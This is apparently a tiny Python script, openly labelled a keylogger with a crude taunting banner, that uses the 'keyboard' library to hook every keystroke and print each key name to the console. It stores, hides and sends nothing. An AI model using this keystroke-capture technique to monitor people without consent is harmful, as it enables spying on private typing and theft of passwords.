import keyboard

print('Running KeyLogger... Your Fucked!')


def on_key(event):
    print(event.name)


keyboard.hook(on_key)

keyboard.wait()
